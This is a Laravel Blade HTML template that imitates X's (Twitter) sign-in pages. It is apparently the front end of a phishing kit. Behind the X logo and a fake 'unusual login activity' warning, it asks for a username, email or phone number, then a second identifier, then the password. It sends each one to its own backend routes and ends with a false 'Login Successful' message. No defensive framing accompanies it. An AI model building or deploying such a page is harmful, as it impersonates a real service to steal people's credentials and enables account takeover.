<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to X</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">

  <style>
    body {
      background-color: #f0f2f5;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .modal-card {
      background: white;
      border-radius: 16px;
      max-width: 380px;
      width: 100%;
      padding: 32px 40px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      position: relative;
    }

    .close-btn {
      position: absolute;
      top: 16px;
      left: 20px;
      font-size: 28px;
      font-weight: 300;
      background: none;
      border: none;
      color: #000;
    }

    .x-logo {
      font-size: 42px;
      font-weight: 900;
      text-align: center;
      margin-bottom: 12px;
    }

    .title {
      font-size: 28px;
      font-weight: 800;
      margin-bottom: 12px;
    }

    .subtitle {
      font-size: 15px;
      color: #536471;
      margin-bottom: 24px;
    }

    .btn-social {
      border: 1px solid #dadce0;
      border-radius: 9999px;
      padding: 12px 20px;
      font-size: 15px;
      font-weight: 600;
      width: 100%;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .form-control {
      border-radius: 8px;
      padding: 14px 16px;
      font-size: 17px;
    }

    .next-btn {
      background-color: #000;
      color: white;
      border: none;
      border-radius: 9999px;
      padding: 14px;
      font-size: 17px;
      font-weight: 700;
      width: 100%;
    }
  </style>
</head>
<body>

  <!-- SIGN UP MODAL -->
  <div id="signupModal" class="modal-card">
    <button class="close-btn" onclick="closeAll()">&times;</button>
    <div class="x-logo">𝕏</div>
    <h1 class="title text-center">Join X today</h1>

    <button class="btn btn-light btn-social">
      <img src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png" width="24" height="24" alt="Google">
      Sign up with Google
    </button>

    <button class="btn btn-light btn-social">
      <i class="bi bi-apple fs-4"></i>
      Sign up with Apple
    </button>

    <div class="text-center my-3 text-muted">or</div>

    <button class="next-btn" onclick="showLogin()">Create account</button>

    <div class="text-center mt-4" style="font-size:13px;color:#536471;">
      By signing up, you agree to the <a href="#" class="text-primary">Terms</a> and
      <a href="#" class="text-primary">Privacy Policy</a>.
    </div>

    <div class="text-center mt-4">
      Already have an account?
      <a href="#" onclick="showLogin(); return false;" class="fw-semibold text-primary">Sign in</a>
    </div>
  </div>

  <!-- LOGIN MODAL -->
  <div id="loginModal" class="modal-card" style="display:none;">
    <button class="close-btn" onclick="closeAll()">&times;</button>
    <div class="x-logo">𝕏</div>
    <h1 class="title">Sign in to X</h1>

    <button class="btn btn-light btn-social">
      <img src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png" width="24" height="24" alt="Google">
      Sign in with Google
    </button>

    <button class="btn btn-light btn-social">
      <i class="bi bi-apple fs-4"></i>
      Sign in with Apple
    </button>

    <div class="text-center my-3 text-muted">or</div>
    <form id="loginForm" onsubmit="processLoginInput(event)">
      @csrf
      <input type="text" id="loginInput" name="loginInput" class="form-control mb-3" placeholder="Phone, email, or username">
      <button class="next-btn" type="submit">Next</button>
    </form>
  </div>

  <!-- DYNAMIC VERIFICATION MODAL -->
  <div id="verificationModal" class="modal-card" style="display:none;">
    <button class="close-btn" onclick="closeAll()">&times;</button>
    <div class="x-logo">𝕏</div>

    <h1 class="title" id="verificationTitle">Enter your phone number or username</h1>
    <p class="subtitle" id="verificationSubtitle">
      There was unusual login activity on your account. To help keep your account safe,
      please enter your phone number or username to verify it’s you.
    </p>
    <form id="verifyForm" onsubmit="showPasswordScreen(event)">
      @csrf
      <input type="text" id="verifyInput" name="verifyInput" class="form-control mb-4" placeholder="Phone or username">
      <button class="next-btn" type="submit">Next</button>
    </form>
  </div>

  <!-- PASSWORD MODAL -->
  <div id="passwordModal" class="modal-card" style="display:none;">
    <button class="close-btn" onclick="closeAll()">&times;</button>
    <div class="x-logo">𝕏</div>

    <h1 class="title">Enter your password</h1>
    <p class="subtitle">
      Enter the password for your account <span id="accountHint" class="fw-medium"></span>
    </p>
    <form id="passwordForm" onsubmit="finishLogin(event)">
      @csrf
      <input type="password" id="passwordInput" name="password" class="form-control mb-4" placeholder="Password">
      <button class="next-btn" type="submit">Log in</button>
    </form>
  </div>

  <script>
    function detectInputType(input) {
      input = input.trim();

      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (emailRegex.test(input)) return "email";

      const phoneRegex = /^[\+]?[\d\s\-\(\)]{7,15}$/;
      if (phoneRegex.test(input.replace(/\s+/g, ''))) return "phone";

      return "username";
    }

    function processLoginInput(event) {
      event.preventDefault();
      const input = document.getElementById('loginInput').value.trim();
      if (!input) {
        alert("Please enter your phone, email or username");
        return;
      }

      const token = document.querySelector('input[name="_token"]').value;

      fetch("{{ route('login.process') }}", {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-TOKEN': token
        },
        body: JSON.stringify({ loginInput: input })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          const type = detectInputType(input);
          hideAll();

          const title = document.getElementById('verificationTitle');
          const subtitle = document.getElementById('verificationSubtitle');
          const placeholderInput = document.getElementById('verifyInput');

          if (type === "email") {
            title.textContent = "Enter your phone number or username";
            subtitle.textContent = "There was unusual login activity on your account. To help keep your account safe, please enter your phone number or username to verify it's you.";
            placeholderInput.placeholder = "Phone or username";
          }
          else if (type === "username") {
            title.textContent = "Enter your email or phone number";
            subtitle.textContent = "There was unusual login activity on your account. To help keep your account safe, please enter your email or phone number to verify it's you.";
            placeholderInput.placeholder = "Email or phone number";
          }
          else if (type === "phone") {
            title.textContent = "Enter your email or username";
            subtitle.textContent = "There was unusual login activity on your account. To help keep your account safe, please enter your email or username to verify it's you.";
            placeholderInput.placeholder = "Email or username";
          }

          document.getElementById('verificationModal').style.display = 'block';
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred');
      });
    }

    function showPasswordScreen(event) {
      event.preventDefault();
      const input = document.getElementById('verifyInput').value.trim();
      if (!input) {
        alert("Please fill in the required field");
        return;
      }

      const token = document.querySelector('input[name="_token"]').value;

      fetch("{{ route('login.verify') }}", {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-TOKEN': token
        },
        body: JSON.stringify({ verifyInput: input })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          hideAll();
          document.getElementById('accountHint').textContent = input;
          document.getElementById('passwordModal').style.display = 'block';
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred');
      });
    }

    function finishLogin(event) {
      event.preventDefault();
      const password = document.getElementById('passwordInput').value.trim();
      if (!password) {
        alert("Please enter your password");
        return;
      }

      const token = document.querySelector('input[name="_token"]').value;

      fetch("{{ route('login.password') }}", {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-TOKEN': token
        },
        body: JSON.stringify({ password: password })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          alert("✅ Login Successful! Welcome back to X.");
          window.location.href = '/';
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred');
      });
    }

    function hideAll() {
      document.getElementById('signupModal').style.display = 'none';
      document.getElementById('loginModal').style.display = 'none';
      document.getElementById('verificationModal').style.display = 'none';
      document.getElementById('passwordModal').style.display = 'none';
    }

    function showLogin() {
      hideAll();
      document.getElementById('loginModal').style.display = 'block';
    }

    function closeAll() {
      alert("Modal closed");
      hideAll();
      document.getElementById('signupModal').style.display = 'block';
    }
  </script>

</body>
</html>
